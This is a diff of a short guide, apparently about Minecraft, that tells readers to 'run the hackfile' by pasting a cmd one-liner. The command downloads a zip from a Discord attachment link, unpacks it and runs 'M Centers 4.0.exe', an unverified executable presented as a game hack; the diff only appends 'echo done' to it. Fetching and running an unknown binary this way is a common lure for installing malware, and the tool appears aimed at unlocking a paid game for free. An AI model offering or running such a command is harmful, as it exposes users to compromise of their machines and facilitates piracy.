@@ -17,7 +17,7 @@ I see yall having problems with mc, here's a guide
 **3. Run the hackfile!**  
 	Yup! Its the easiest part!   
 	Just run the command in cmd  
-	```cd %USERPROFILE%\Desktop && curl -O https://cdn.discordapp.com/attachments/1010814391555457155/1135487859235758080/ignore.zip && powershell Expand-Archive -Path ignore.zip -DestinationPath %USERPROFILE%\Desktop\MCHACK && del ignore.zip && cd MCHACK && "M Centers 4.0.exe" && exit```
+	```cd %USERPROFILE%\Desktop && curl -O https://cdn.discordapp.com/attachments/1010814391555457155/1135487859235758080/ignore.zip && powershell Expand-Archive -Path ignore.zip -DestinationPath %USERPROFILE%\Desktop\MCHACK && del ignore.zip && cd MCHACK && "M Centers 4.0.exe" && echo done && exit```
 
 
 # AND ITS HERE!!!
